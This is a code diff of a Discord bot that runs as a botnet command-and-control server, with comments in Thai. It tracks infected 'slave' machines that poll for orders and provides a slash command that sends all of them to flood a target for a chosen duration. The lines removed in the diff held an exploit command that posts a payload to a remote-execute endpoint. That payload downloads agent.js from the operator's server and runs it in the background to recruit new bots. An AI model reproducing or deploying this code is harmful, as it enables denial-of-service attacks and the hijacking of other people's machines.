@@ -1,29 +1,35 @@
 const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
-const axios = require('axios');
-const express = require('express');
-
-const app = express();
-app.use(express.json());
+const http = require('http');
 
 const PORT = process.env.PORT || 3000;
 let slaveNodes = [];
 
-// HTTP Endpoint สำหรับให้เครื่องทาสรายงานตัวและรับคำสั่ง
-app.post('/poll', (req, res) => {
-    const { id } = req.body;
-    if (id && !slaveNodes.some(node => node.id === id)) {
-        slaveNodes.push({ id, ip: req.ip, lastSeen: Date.now() });
-        console.log(`[+] เครื่องทาสรายงานตัวเข้ามาใหม่: ${id} (IP: ${req.ip})`);
-    }
-    // ส่งคำสั่งปัจจุบันกลับไปให้เครื่องทาส
-    res.json({ command: global.currentAttackCommand || null });
+// สร้าง HTTP Server แบบดั้งเดิมของ Node.js ไม่ต้องพึ่ง Express ให้หงุดหงิด
+const server = http.createServer((req, res) => {
+    let body = '';
+    req.on('data', chunk => { body += chunk; });
+    req.on('end', () => {
+        if (req.method === 'POST' && req.url === '/poll') {
+            try {
+                const data = JSON.parse(body);
+                if (data.id && !slaveNodes.some(node => node.id === data.id)) {
+                    slaveNodes.push({ id: data.id, ip: req.socket.remoteAddress, lastSeen: Date.now() });
+                    console.log(`[+] เครื่องทาสรายงานตัวเข้ามาใหม่: ${data.id}`);
+                }
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ command: global.currentAttackCommand || null }));
+            } catch (e) {
+                res.writeHead(400);
+                res.end('Bad Request');
+            }
+        } else {
+            res.writeHead(200, { 'Content-Type': 'text/plain' });
+            res.end('JARVIS C2 Server is running smoothly.');
+        }
+    });
 });
 
-app.get('/', (req, res) => {
-    res.send('JARVIS C2 Server is running smoothly.');
-});
-
-app.listen(PORT, () => {
+server.listen(PORT, () => {
     console.log(`[+] C2 HTTP Server running on port ${PORT}`);
 });
 
@@ -43,33 +49,16 @@ client.once('ready', async () => {
         new SlashCommandBuilder()
             .setName('swarm-attack')
             .setDescription('สั่งการกองทัพเครื่องทาสทั้งหมดรุมยิงเป้าหมายพร้อมกัน!')
-            .addStringOption(option =>
-                option.setName('target')
-                    .setDescription('URL หรือ IP เป้าหมายที่ต้องการถล่ม')
-                    .setRequired(true))
-            .addIntegerOption(option =>
-                option.setName('duration')
-                    .setDescription('ระยะเวลาในการยิง (วินาที)')
-                    .setRequired(true)),
+            .addStringOption(option => option.setName('target').setDescription('IP หรือ URL เป้าหมาย').setRequired(true))
+            .addIntegerOption(option => option.setName('duration').setDescription('ระยะเวลา (วินาที)').setRequired(true)),
         new SlashCommandBuilder()
             .setName('nodes-status')
-            .setDescription('ตรวจสอบจำนวนกองทัพเครื่องทาสที่ออนไลน์อยู่ตอนนี้'),
-        new SlashCommandBuilder()
-            .setName('exploit-target')
-            .setDescription('ส่งคำสั่งเจาะช่องโหว่เป้าหมายเพื่อเพิ่มเครื่องทาสเข้ากองทัพ')
-            .addStringOption(option =>
-                option.setName('target-url')
-                    .setDescription('URL เป้าหมายที่มีช่องโหว่')
-                    .setRequired(true))
+            .setDescription('ตรวจสอบจำนวนเครื่องทาสในกองทัพ')
     ];
 
     const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
-
     try {
-        await rest.put(
-            Routes.applicationCommands(client.user.id),
-            { body: commands },
-        );
+        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
         console.log('[+] C2 Slash commands registered successfully.');
     } catch (error) {
         console.error(error);
@@ -80,7 +69,7 @@ client.on('interactionCreate', async interaction => {
     if (!interaction.isChatInputCommand()) return;
 
     if (interaction.commandName === 'nodes-status') {
-        return interaction.reply({ content: `[📊] สถานะกองทัพตอนนี้:\n- จำนวนเครื่องทาสที่เชื่อมต่ออยู่: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
+        return interaction.reply({ content: `[📊] สถานะกองทัพตอนนี้:\n- จำนวนเครื่องทาส: **${slaveNodes.length} เครื่อง**`, ephemeral: true });
     }
 
     if (interaction.commandName === 'swarm-attack') {
@@ -88,10 +77,9 @@ client.on('interactionCreate', async interaction => {
         const duration = interaction.options.getInteger('duration');
 
         if (slaveNodes.length === 0) {
-            return interaction.reply({ content: '[-] ไม่มีเครื่องทาสในกองทัพ! ไปหาเหยื่อมาก่อนไอ้น้อง!', ephemeral: true });
+            return interaction.reply({ content: '[-] ไม่มีเครื่องทาสในกองทัพ!', ephemeral: true });
         }
 
-        // ตั้งค่าคำสั่งโจมตีเพื่อให้เครื่องทาสดึงไปรัน
         global.currentAttackCommand = {
             id: Math.random().toString(36).substring(7),
             action: 'attack',
@@ -99,34 +87,11 @@ client.on('interactionCreate', async interaction => {
             duration: duration
         };
 
-        await interaction.reply(`[🔥⚡] ส่งสัญญาณคำสั่งไปยังกองทัพ ${slaveNodes.length} เครื่อง เพื่อรุมถล่ม ${target} เป็นเวลา ${duration} วินาทีแล้ว!`);
+        await interaction.reply(`[🔥⚡] สั่งการกองทัพ ${slaveNodes.length} เครื่อง ถล่ม ${target} เป็นเวลา ${duration} วินาทีแล้ว!`);
 
-        // ล้างคำสั่งหลังหมดเวลา
         setTimeout(() => {
             global.currentAttackCommand = null;
         }, duration * 1000);
-    }
-
-    if (interaction.commandName === 'exploit-target') {
-        let targetUrl = interaction.options.getString('target-url');
-        await interaction.reply(`[!] กำลังส่งโค้ดเจาะช่องโหว่ใส่เป้าหมาย ${targetUrl} เพื่อดึงเข้ากองทัพ...`);
-
-        try {
-            const vulnerabilityEndpoint = `${targetUrl}/api/v1/execute`;
-            // ดึง Domain ของตัวเองจาก Railway มาใช้ให้อัตโนมัติ
-            const railwayDomain = process.env.RAILWAY_STATIC_URL || `http://localhost:${PORT}`;
-            const payloadCommand = `cd /tmp && curl -O ${railwayDomain}/agent.js && nohup node agent.js > /dev/null 2>&1 &`;
-
-            const response = await axios.post(vulnerabilityEndpoint, { command: payloadCommand }, { timeout: 4000 });
-
-            if (response.status === 200) {
-                await interaction.followUp(`[+] สำเร็จ! เจาะและส่ง Payload ไปยัง ${targetUrl} เรียบร้อย!`);
-            } else {
-                await interaction.followUp(`[-] เป้าหมาย ${targetUrl} ป้องกันแน่นหนา เจาะไม่เข้า!`);
-            }
-        } catch (err) {
-            await interaction.followUp(`[-] เกิดข้อผิดพลาดในการเจาะเป้าหมาย ${targetUrl}: ${err.message}`);
-        }
     }
 });
 
